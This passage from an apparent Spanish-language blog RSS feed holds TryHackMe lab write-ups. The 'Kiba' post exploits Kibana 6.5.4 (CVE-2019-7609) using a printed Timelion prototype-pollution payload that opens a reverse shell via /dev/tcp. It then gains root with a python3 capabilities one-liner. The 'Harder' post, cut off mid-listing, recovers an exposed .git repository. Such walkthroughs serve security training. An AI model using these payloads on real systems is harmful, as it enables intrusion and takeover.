&lt;span class=&#34;c1&#34;&gt;#Git&lt;/span&gt; 
git checkout -- .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos en uno de los archivos anteriores el usuario y contraseña el cual es el objetivo de esta sala.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/githappens/Screenshot_2020-08-31_16-14-49.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/githappens/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/githappens/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>gittools</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Kiba</title>
        <link>https://sckull.github.io/posts/kiba/</link>
        <pubDate>Mon, 31 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Mon, 31 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/kiba/</guid>
        <description>Kiba es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Kiba es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Kiba&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;480&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap--masscan&#34;&gt;NMAP &amp;amp; MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto 5601, puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Aug 31 18:26:06 2020 as: nmap -sV -o mini_scan kiba.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; kiba.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.22.111&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Aug 31 18:26:43 2020 -- 1 IP address (1 host up) scanned in 37.55 seconds&lt;/span&gt;

masscan -p1-65535,U:1-65535 10.10.22.111 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-08-31 22:51:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 5601/tcp on 10.10.22.111
Discovered open port 80/tcp on 10.10.22.111
Discovered open port 22/tcp on 10.10.22.111
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80 con una imagen ASCII de Cicada y con una frase interesante &lt;code&gt;&amp;quot;linux capabilities&amp;quot;&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-28-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, no encontramos nada interesante.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/kiba$ gobuster dir -u http://kiba.thm/ -w &lt;span class=&#34;nv&#34;&gt;$LIST&lt;/span&gt;/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http-puerto-5601&#34;&gt;HTTP PUERTO 5601&lt;/h2&gt;
&lt;p&gt;Encontramos el dashboard de kibana.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_16-56-39.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos un query (&lt;code&gt;_aliases&lt;/code&gt; y &lt;code&gt;.kibana/_search&lt;/code&gt; ambos GET) en la consola de &lt;code&gt;Dev Tools&lt;/code&gt; para ver la version de kibana y vemos que es &lt;code&gt;6.5.4&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-21-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;kibana--660---rce&#34;&gt;KIBANA &amp;lt; 6.6.0 - RCE&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de posibles exploits o vulnerabilidades para esta version de Kibana y encontramos un &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;PoC que permite ejecutar comandos&lt;/strong&gt;&lt;/a&gt; a traves de la &amp;ldquo;contaminacion de un objeto&amp;rdquo;. Encontramos informacion de otros dos payloads y de como parchar esta vulnerabilidad en &lt;a href=&#34;https://github.com/mpgn/CVE-2019-7609&#34;&gt;&lt;strong&gt;Github&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Utilizamos el payload para obtener una shell inversa con los pasos que se muestran en el &lt;a href=&#34;https://slides.com/securitymb/prototype-pollution-in-kibana/#/54/0/0&#34;&gt;&lt;strong&gt;slide&lt;/strong&gt;&lt;/a&gt; y logramos obtener una shell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;.es&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.props&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;label.__proto__.env.AAAA&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;bash -c \&amp;#39;&lt;/span&gt;bash -i&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.10.10/12345 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);//&amp;#39;)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.props(label.__proto__.env.NODE_OPTIONS=&amp;#39;--require /proc/self/environ&amp;#39;)
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-35-43.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-08.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-36-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion y vemos algunas configuraciones realizadas en un archivo que se encuentra en la carpeta principal que esta relacionada con capabilities, lo cual esta relacionado con la frase que encontramos en la pagina del puerto 80.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-40-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;getcap -r / 2&amp;gt;/dev/null&lt;/code&gt; para verificar que el archivo visto en el historial contiene estas &amp;ldquo;capacidades&amp;rdquo; (similares a los SUID). Vemos que aparece junto a otros.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-43-52.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos la explotacion de este archivo, que es python3 para obtener una shell root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./python3 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/kiba/Screenshot_2020-08-31_17-48-47.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Informacion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&#34;&gt;&lt;strong&gt;Capabilities - Privilege Escalation&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://twitter.com/chybeta/status/1184479040645632001&#34;&gt;&lt;strong&gt;Kibana - PoC&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/en/publications/pwning-an-outdated-kibana-with-not-so-sad-vulnerabilities.html&#34;&gt;&lt;strong&gt;Kibana - Sad Vulnerabilities&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/kiba/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>kibana</category>
            
          
            
              <category>capabilities</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Harder</title>
        <link>https://sckull.github.io/posts/harder/</link>
        <pubDate>Tue, 18 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 18 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/harder/</guid>
        <description>Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Harder es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Harder&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Real pentest findings combined&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Medio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/arcc&#34;&gt;arcc&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Aug 18 20:32:35 2020 as: nmap -sV -o mini_scan harder.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; harder.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.254.174&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.18.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Aug 18 20:33:24 2020 -- 1 IP address (1 host up) scanned in 48.83 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_18-35-25.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En las cookies de la solicitud a la pagina encontramos un subdominio nuevo el cual agregamos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-05-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;http---pwd&#34;&gt;HTTP - PWD&lt;/h2&gt;
&lt;p&gt;En la pagina encontramos un panel de logeo, al ingresar credenciales por default nos muestra un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-06-42.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ingresar admin:admin nos muestra:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;extra security in place. our source code will be reviewed soon ...
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en el nuevo dominio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/harder$ gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; -q -x php,html,txt -k
/.git/HEAD &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/auth.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/secret.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gittools&#34;&gt;GITTOOLS&lt;/h2&gt;
&lt;p&gt;Vemos que existe un directorio de &lt;code&gt;.git&lt;/code&gt; o más bien un repositorio expuesto. Utilizamos &lt;a href=&#34;https://github.com/internetwache/GitTools&#34;&gt;&lt;strong&gt;GitTools&lt;/strong&gt;&lt;/a&gt; para obtener lo que se pueda de este repositorio.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-25-15.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Despues de realizar un &lt;code&gt;git checkout -- .&lt;/code&gt; para recuperar algunos archivos vemos 3 de ellos &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-27-32.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el archivo &lt;code&gt;.gitignore&lt;/code&gt; vemos dos nombres de archivos, uno de ellos no lo tenemos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/harder/Screenshot_2020-08-18_19-29-58.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El archivo &lt;code&gt;index.php&lt;/code&gt; contiene tres parametros que son obtenidos a partir de la variable/array &lt;code&gt;$creds&lt;/code&gt; y que seguramente se encuentran en &lt;code&gt;credentials.php&lt;/code&gt; además de ello obtiene &lt;code&gt;auth.php&lt;/code&gt;, &lt;code&gt;hmac.php&lt;/code&gt; y &lt;code&gt;credentials.php&lt;/code&gt;. El archivo &lt;code&gt;auth.php&lt;/code&gt; vemos el codigo que realiza login, logout, verifica la contraseña y contine el formulario de logeo.&lt;/p&gt;

&lt;div id=&#34;36c53649cb57bbe5&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;index.php&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;auth.php&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;64853331c28a0b0c&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
